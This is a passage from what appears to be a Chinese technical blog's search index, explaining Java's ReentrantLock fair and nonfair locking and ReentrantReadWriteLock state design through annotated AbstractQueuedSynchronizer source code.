= <span class=\"literal\">null</span>; <span class=\"comment\">// help GC</span></span><br><span class=\"line\">                failed = <span class=\"literal\">false</span>;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> interrupted;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (shouldParkAfterFailedAcquire(p, node) &amp;&amp;</span><br><span class=\"line\">                parkAndCheckInterrupt())</span><br><span class=\"line\">                interrupted = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (failed)</span><br><span class=\"line\">            cancelAcquire(node);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在获取锁失败后，调用shouldParkAfterFailedAcquire、parkAndCheckInterrupt设置阻塞当前线程。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">boolean</span> <span class=\"title function_\">shouldParkAfterFailedAcquire</span><span class=\"params\">(Node pred, Node node)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//获取上一个节点线程等待状态，默认为0</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">ws</span> <span class=\"operator\">=</span> pred.waitStatus;</span><br><span class=\"line\">    <span class=\"comment\">//如果为SIGNAL（-1）直接返回，表示已经设置了节点等待状态</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ws == Node.SIGNAL)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    <span class=\"comment\">//如果等待状态大于0，表示上个线程节点已经被取消CANCELLED、则跳过上一个节点，把当前节点向前移，直到出现不大于0的情况</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ws &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">            node.prev = pred = pred.prev;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">while</span> (pred.waitStatus &gt; <span class=\"number\">0</span>);</span><br><span class=\"line\">        pred.next = node;</span><br><span class=\"line\">    <span class=\"comment\">//如果等于0一般为节点才初始化，设置状态为SIGNAL（-1）</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        compareAndSetWaitStatus(pred, ws, Node.SIGNAL);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//上一个节点状态为SIGNAL（-1），则设置阻塞当前线程。当</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"title function_\">parkAndCheckInterrupt</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    LockSupport.park(<span class=\"built_in\">this</span>);</span><br><span class=\"line\">    <span class=\"comment\">//判断当前线程是否已经中断，并复位线程中断状态，因为线程在中断状态时，park不生效，会立即执行，如果不复位，会导致外面一直循环获取锁，CPU占用过高</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> Thread.interrupted();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上述描述了线程节点加入链表，之后线程被阻塞，当线程解除阻塞后。重新获取锁，并返回线程中断状态。之后调用线程interrupt。<br>如果在上述，循环获取锁过程中，出现异常导致退出循环且未获取到锁，将会调用cancelAcquire</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">cancelAcquire</span><span class=\"params\">(Node node)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (node == <span class=\"literal\">null</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    <span class=\"comment\">//设置当前节点线程为空</span></span><br><span class=\"line\">    node.thread = <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 获取上一个节点</span></span><br><span class=\"line\">    <span class=\"type\">Node</span> <span class=\"variable\">pred</span> <span class=\"operator\">=</span> node.prev;</span><br><span class=\"line\">    <span class=\"comment\">//如果等待状态大于0，表示上个线程节点已经被取消CANCELLED、则跳过上一个节点，把当前节点向前移，直到出现不大于0的情况</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (pred.waitStatus &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">        node.prev = pred = pred.prev;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// predNext is the apparent node to unsplice. CASes below will</span></span><br><span class=\"line\">    <span class=\"comment\">// fail if not, in which case, we lost race vs another cancel</span></span><br><span class=\"line\">    <span class=\"comment\">// or signal, so no further action is necessary.</span></span><br><span class=\"line\">    <span class=\"type\">Node</span> <span class=\"variable\">predNext</span> <span class=\"operator\">=</span> pred.next;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//设置当前节点等待状态为取消-1</span></span><br><span class=\"line\">    node.waitStatus = Node.CANCELLED;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// If we are the tail, remove ourselves.</span></span><br><span class=\"line\">    <span class=\"comment\">//如果当前节点是更节点，设置根节点为上一个节点</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (node == tail &amp;&amp; compareAndSetTail(node, pred)) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//设置原来上一个节点的下个节点为null</span></span><br><span class=\"line\">        compareAndSetNext(pred, predNext, <span class=\"literal\">null</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// If successor needs signal, try to set pred&#x27;s next-link</span></span><br><span class=\"line\">        <span class=\"comment\">// so it will get one. Otherwise wake it up to propagate.</span></span><br><span class=\"line\">        <span class=\"type\">int</span> ws;</span><br><span class=\"line\">        <span class=\"comment\">//如果上一个节点不为头，且线程不为null，且上一个节点等待状态为SIGNAL</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (pred != head &amp;&amp;</span><br><span class=\"line\">            ((ws = pred.waitStatus) == Node.SIGNAL ||</span><br><span class=\"line\">             (ws &lt;= <span class=\"number\">0</span> &amp;&amp; compareAndSetWaitStatus(pred, ws, Node.SIGNAL))) &amp;&amp;</span><br><span class=\"line\">            pred.thread != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//获取下一个节点</span></span><br><span class=\"line\">            <span class=\"type\">Node</span> <span class=\"variable\">next</span> <span class=\"operator\">=</span> node.next;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (next != <span class=\"literal\">null</span> &amp;&amp; next.waitStatus &lt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">                <span class=\"comment\">//设置之前的上个节点的下一个节点为当前节点的下一个节点，这里没有设置下个节点的上一个节点为pred</span></span><br><span class=\"line\">                <span class=\"comment\">//在后续解除阻塞时，是从后向前遍历，同时会判断当前节点等待状态是否小于0，这里当前节点状态已经设置为0，当前节点会被跳过</span></span><br><span class=\"line\">                compareAndSetNext(pred, predNext, next);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//如果为第二个节点，或者上一个节点等待状态不为SIGNAL，解除当前节点的下一个节点的阻塞状态</span></span><br><span class=\"line\">            unparkSuccessor(node);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        node.next = node; <span class=\"comment\">// help GC</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">unparkSuccessor</span><span class=\"params\">(Node node)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">     * If status is negative (i.e., possibly needing signal) try</span></span><br><span class=\"line\"><span class=\"comment\">     * to clear in anticipation of signalling.  It is OK if this</span></span><br><span class=\"line\"><span class=\"comment\">     * fails or if status is changed by waiting thread.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">     <span class=\"comment\">//修改当前节点等待状态为0</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">ws</span> <span class=\"operator\">=</span> node.waitStatus;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ws &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">        compareAndSetWaitStatus(node, ws, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">     * Thread to unpark is held in successor, which is normally</span></span><br><span class=\"line\"><span class=\"comment\">     * just the next node.  But if cancelled or apparently null,</span></span><br><span class=\"line\"><span class=\"comment\">     * traverse backwards from tail to find the actual</span></span><br><span class=\"line\"><span class=\"comment\">     * non-cancelled successor.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"comment\">//获取当前节点下一个节点</span></span><br><span class=\"line\">    <span class=\"type\">Node</span> <span class=\"variable\">s</span> <span class=\"operator\">=</span> node.next;</span><br><span class=\"line\">    <span class=\"comment\">//如果当前节点为null，或者下一个节点等待状态为0</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (s == <span class=\"literal\">null</span> || s.waitStatus &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        s = <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"comment\">//从后向前遍历线程链表，直到当前节点，这样是因为在enq插入节点时，为了保证能遍历所有的节点</span></span><br><span class=\"line\">        <span class=\"comment\">//如果从前遍历，会导致如果下一个节点为正在插入的新节点，会出现获取不到新节点的情况，极端情况下会出现新节点获取不到锁，一直被阻塞</span></span><br><span class=\"line\">        <span class=\"comment\">//也就是上一个节点可以保证存在而且是对的，但是下一个节点可能无法获取</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">Node</span> <span class=\"variable\">t</span> <span class=\"operator\">=</span> tail; t != <span class=\"literal\">null</span> &amp;&amp; t != node; t = t.prev)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (t.waitStatus &lt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">                s = t;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//如果存在下一个节点，解除阻塞</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (s != <span class=\"literal\">null</span>)</span><br><span class=\"line\">        LockSupport.unpark(s.thread);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>解锁过程，ReentrantLock.unlock，之后调用父类AbstractQueuedSynchronizer.release</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"title function_\">release</span><span class=\"params\">(<span class=\"type\">int</span> arg)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//尝试释放资源：判断是否当前线程释放锁，如果完全解锁即锁状态为0，设置当前线程为null</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tryRelease(arg)) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//获取等待链表头</span></span><br><span class=\"line\">        <span class=\"type\">Node</span> <span class=\"variable\">h</span> <span class=\"operator\">=</span> head;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (h != <span class=\"literal\">null</span> &amp;&amp; h.waitStatus != <span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"comment\">//解除下一个节点阻塞状态，如上</span></span><br><span class=\"line\">            unparkSuccessor(h);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>以上是公平锁加锁解锁过程，公平锁就是如果多个未获取锁的线程在等待锁，维护一段链表，把当前线程放入链表末尾，之后线程进入阻塞状态，直到线程被上一个节点解除阻塞。</p>\n<h4 id=\"NonfairSync\"><a href=\"#NonfairSync\" class=\"headerlink\" title=\"NonfairSync\"></a>NonfairSync</h4><p>非公平锁，创建ReentrantLock默认就是非公平锁。<br>在非公平锁情况下，如果调用lock，最终调用的是NonfairSync.lock</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">final</span> <span class=\"keyword\">void</span> <span class=\"title function_\">lock</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//尝试直接修改当前锁状态0-&gt;1，如果修改成功，直接设置拥有锁的线程为当前线程</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (compareAndSetState(<span class=\"number\">0</span>, <span class=\"number\">1</span>))</span><br><span class=\"line\">        setExclusiveOwnerThread(Thread.currentThread());</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"comment\">//修改失败调用父类AbstractQueuedSynchronizer.acquire()，父类会回调子类tryAcquire如下</span></span><br><span class=\"line\">        acquire(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"title function_\">tryAcquire</span><span class=\"params\">(<span class=\"type\">int</span> acquires)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//调用父类Sync.nonfairTryAcquire</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> nonfairTryAcquire(acquires);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//abstract static class Sync</span></span><br><span class=\"line\"><span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"title function_\">nonfairTryAcquire</span><span class=\"params\">(<span class=\"type\">int</span> acquires)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">Thread</span> <span class=\"variable\">current</span> <span class=\"operator\">=</span> Thread.currentThread();</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> getState();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (c == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//尝试修改当前状态</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (compareAndSetState(<span class=\"number\">0</span>, acquires)) &#123;</span><br><span class=\"line\">            setExclusiveOwnerThread(current);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//是否重入锁</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (current == getExclusiveOwnerThread()) &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">nextc</span> <span class=\"operator\">=</span> c + acquires;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (nextc &lt; <span class=\"number\">0</span>) <span class=\"comment\">// overflow</span></span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Error</span>(<span class=\"string\">&quot;Maximum lock count exceeded&quot;</span>);</span><br><span class=\"line\">        setState(nextc);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>非公平锁在获取锁失败后，后续操作和公平锁一样，直接生产线程节点，放入队列末尾，阻塞等待解除。</p>\n<p>公平锁和非公平锁区别在于：<br>公平锁：去获取锁时，多判断一次，当前线程节点是否是下一个获取锁的节点（就算锁已经释放，也不获取），按照链表先后顺序执行。<br>非公平锁：获取锁时，直接尝试获取锁，如果这时候锁已经释放，直接获取锁，如果获取失败，后续按照公平锁方式创建线程节点加入等待链表。</p>\n<p>在ReentrantLock.tryLock()，实际上是调用Sync.nonfairTryAcquire，如上，直接尝试获取锁，如果失败，不进入等待队列。<br>调用ReentrantLock.tryLock(long timeout, TimeUnit unit)，获取锁时调用的tryAcquire，和tryLock调用Sync.nonfairTryAcquire直接尝试获取锁不一样，该方法受是否公平模式影响。获取失败后会进入链表，并设置阻塞时间。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//实际调用的方法</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"title function_\">tryAcquireNanos</span><span class=\"params\">(<span class=\"type\">int</span> arg, <span class=\"type\">long</span> nanosTimeout)</span></span><br><span class=\"line\">        <span class=\"keyword\">throws</span> InterruptedException &#123;</span><br><span class=\"line\">    <span class=\"comment\">//判断线程是否中断，还原中断状态抛出异常</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (Thread.interrupted())</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">InterruptedException</span>();</span><br><span class=\"line\">    <span class=\"comment\">//尝试获取锁，失败后调用doAcquireNanos，在等待时间内获取锁</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> tryAcquire(arg) ||</span><br><span class=\"line\">        doAcquireNanos(arg, nanosTimeout);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"type\">boolean</span> <span class=\"title function_\">doAcquireNanos</span><span class=\"params\">(<span class=\"type\">int</span> arg, <span class=\"type\">long</span> nanosTimeout)</span></span><br><span class=\"line\">        <span class=\"keyword\">throws</span> InterruptedException &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (nanosTimeout &lt;= <span class=\"number\">0L</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"comment\">//计算等待结束时间</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">deadline</span> <span class=\"operator\">=</span> System.nanoTime() + nanosTimeout;</span><br><span class=\"line\">    <span class=\"comment\">//生成线程等待节点</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">Node</span> <span class=\"variable\">node</span> <span class=\"operator\">=</span> addWaiter(Node.EXCLUSIVE);</span><br><span class=\"line\">    <span class=\"type\">boolean</span> <span class=\"variable\">failed</span> <span class=\"operator\">=</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//CAS循环操作</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">final</span> <span class=\"type\">Node</span> <span class=\"variable\">p</span> <span class=\"operator\">=</span> node.predecessor();</span><br><span class=\"line\">            <span class=\"comment\">//如果当前节点为第二个节点，尝试获取锁</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (p == head &amp;&amp; tryAcquire(arg)) &#123;</span><br><span class=\"line\">                setHead(node);</span><br><span class=\"line\">                p.next = <span class=\"literal\">null</span>; <span class=\"comment\">// help GC</span></span><br><span class=\"line\">                failed = <span class=\"literal\">false</span>;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            nanosTimeout = deadline - System.nanoTime();</span><br><span class=\"line\">            <span class=\"comment\">//计算是否超时</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (nanosTimeout &lt;= <span class=\"number\">0L</span>)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">            <span class=\"comment\">//同之前代码，设置等待状态，同时判断离结束时间是否小于spinForTimeoutThreshold（1000）</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (shouldParkAfterFailedAcquire(p, node) &amp;&amp;</span><br><span class=\"line\">                nanosTimeout &gt; spinForTimeoutThreshold)</span><br><span class=\"line\">                <span class=\"comment\">//设置阻塞线程时间</span></span><br><span class=\"line\">                LockSupport.parkNanos(<span class=\"built_in\">this</span>, nanosTimeout);</span><br><span class=\"line\">            <span class=\"comment\">//线程被唤醒后判断线程是否中断状态</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (Thread.interrupted())</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">InterruptedException</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (failed)</span><br><span class=\"line\">            cancelAcquire(node);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","categories":["多线程学习"],"tags":["多线程","同步","锁"]},{"title":"Java读写锁","url":"/2017/12/21/Java%E8%AF%BB%E5%86%99%E9%94%81/","content":"<p>在多线程操作过程中，如果写少读多，采用ReentrantLock（排他锁），会比较浪费资源，这种情况下可以采用Java读写锁。</p>\n<h3 id=\"ReadWriteLock\"><a href=\"#ReadWriteLock\" class=\"headerlink\" title=\"ReadWriteLock\"></a>ReadWriteLock</h3><p>ReadWriteLock接口，定义了readLock、writeLock</p>\n<h3 id=\"ReentrantReadWriteLock\"><a href=\"#ReentrantReadWriteLock\" class=\"headerlink\" title=\"ReentrantReadWriteLock\"></a>ReentrantReadWriteLock</h3><p>重入读写锁，ReadWriteLock子类。对于ReadWriteLock，内部主要有：</p>\n<ul>\n<li>ReentrantReadWriteLock.ReadLock readerLock：读锁，Lock接口实现</li>\n<li>ReentrantReadWriteLock.WriteLock writerLock：写锁，Lock接口实现</li>\n<li>Sync sync：同步方法块，抽象接口AbstractQueuedSynchronizer子类，同时有NonfairSync、FairSync两个子类。</li>\n</ul>\n<span id=\"more\"></span>\n<p>读写锁实例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    String[] items = <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[<span class=\"number\">10</span>];</span><br><span class=\"line\">    <span class=\"type\">ReentrantReadWriteLock</span> <span class=\"variable\">readWriteLock</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ReentrantReadWriteLock</span>();</span><br><span class=\"line\">    <span class=\"type\">Lock</span> <span class=\"variable\">read</span> <span class=\"operator\">=</span> readWriteLock.readLock();</span><br><span class=\"line\">    <span class=\"type\">Lock</span> <span class=\"variable\">write</span> <span class=\"operator\">=</span> readWriteLock.writeLock();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">get</span><span class=\"params\">(<span class=\"type\">int</span> index)</span> &#123;</span><br><span class=\"line\">        read.lock();</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> items[index];</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            read.unlock();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">put</span><span class=\"params\">(<span class=\"type\">int</span> index, String str)</span> &#123;</span><br><span class=\"line\">        write.lock();</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            items[index] = str;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            write.unlock();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"读写状态设计\"><a href=\"#读写状态设计\" class=\"headerlink\" title=\"读写状态设计\"></a>读写状态设计</h3><p>同步锁中同步器Sync是读写锁关键部分，其继承自AbstractQueuedSynchronizer（AQS）。同步器是通过一个状态表示锁被一个线程获取的次数，对于读写锁而言，需要在同步状态（state）维护读写两个状态，所以该状态被设计为按位切割，读写锁将改状态分为两个部分，高16位表示读，低16位表示写。<br>0000000000000000-00000000000000000，前面16位表示读，后面16位表示写。<br>在类初始化时定义了3个常量两个方法，如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//状态转换</span></span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">SHARED_SHIFT</span>   <span class=\"operator\">=</span> <span class=\"number\">16</span>;</span><br><span class=\"line\"><span class=\"comment\">//10000000000000000共享单元65536 作用于共享锁</span></span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">SHARED_UNIT</span>    <span class=\"operator\">=</span> (<span class=\"number\">1</span> &lt;&lt; SHARED_SHIFT);</span><br><span class=\"line\"><span class=\"comment\">//最大重入次数65535</span></span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">MAX_COUNT</span>      <span class=\"operator\">=</span> (<span class=\"number\">1</span> &lt;&lt; SHARED_SHIFT) - <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"comment\">//1111111111111111排他标记65535 作用于排他锁</span></span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">EXCLUSIVE_MASK</span> <span class=\"operator\">=</span> (<span class=\"number\">1</span> &lt;&lt; SHARED_SHIFT) - <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//共享锁状态统计，也就是共享锁线程获取数，如果当前状态为196608，二进制表示为110000000000000000，</span></span><br><span class=\"line\"><span class=\"comment\">//通过位运算向右移动16位，得到二进制11，表示有3个线程获取了读锁</span></span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">sharedCount</span><span class=\"params\">(<span class=\"type\">int</span> c)</span>    &#123; <span class=\"keyword\">return</span> c &gt;&gt;&gt; SHARED_SHIFT; &#125;</span><br><span class=\"line\"><span class=\"comment\">//排他锁统计状态，通过与1111111111111111做与运算，得出当前线程是否有被写线程获取</span></span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">exclusiveCount</span><span class=\"params\">(<span class=\"type\">int</span> c)</span> &#123; <span class=\"keyword\">return</span> c &amp; EXCLUSIVE_MASK; &#125;</span><br></pre></td></tr></table></figure>\n<p>在写锁修改状态时直接通过当前状态state + acquires（通常为1），修改状态，也就是修改是低位状态，而对于读而言是state + SHARED_UNIT来修改状态，也就是修改的是高位状态。</p>\n<h3 id=\"WriteLock\"><a href=\"#WriteLock\" class=\"headerlink\" title=\"WriteLock\"></a>WriteLock</h3><p>在写时，调用WriteLock.lock()，实际调用父类AbstractQueuedSynchronizer.acquire()，代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//AbstractQueuedSynchronizer</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">void</span> <span class=\"title function_\">acquire</span><span class=\"params\">(<span class=\"type\">int</span> arg)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//tryAcquire由子类Sync实现，调用的是AbstractQueuedSynchronizer.Sync.TryAcquire()</span></span><br><span class=\"line\">    <span class=\"comment\">//获取锁失败，生成等待线程队列，阻塞等待解除，解除后调用tryAcquire重新获取锁，这之后逻辑同ReentrantLock</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!tryAcquire(arg) &amp;&amp;</span><br><span class=\"line\">        acquireQueued(addWaiter(Node.EXCLUSIVE), arg))</span><br><span class=\"line\">        selfInterrupt();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//AbstractQueuedSynchronizer.Sync</span></span><br><span class=\"line\"><span class=\"comment\">//写锁获取锁时调用，尝试获取锁</span></span><br><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"title function_\">tryAcquire</span><span class=\"params\">(<span class=\"type\">int</span> acquires)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">    * 当存在其他线程读或者写、都会获取失败</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\">    <span class=\"comment\">//获取当前线程</span></span><br><span class=\"line\">    <span class=\"type\">Thread</span> <span class=\"variable\">current</span> <span 